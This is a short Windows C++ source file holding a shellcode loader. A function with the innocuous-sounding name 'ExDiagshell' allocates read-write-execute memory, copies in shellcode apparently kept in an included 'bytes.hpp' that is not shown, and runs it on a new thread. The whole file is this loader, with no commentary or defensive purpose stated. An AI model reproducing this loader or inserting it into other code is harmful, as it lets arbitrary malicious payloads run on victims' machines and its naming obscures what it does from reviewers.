#include <windows.h>
#include <cstring>
#include "bytes.hpp"

BOOL ExDiagshell(const unsigned char* shellcode, size_t shellcodeSize) {
	LPVOID pShellcode = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pShellcode == NULL) {
		return FALSE;
	}

	memcpy(pShellcode, shellcode, shellcodeSize);
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pShellcode, NULL, 0, NULL);
	if (hThread == NULL) {
		VirtualFree(pShellcode, 0, MEM_RELEASE);
		return FALSE;
	}
	CloseHandle(hThread);
	return TRUE;
}
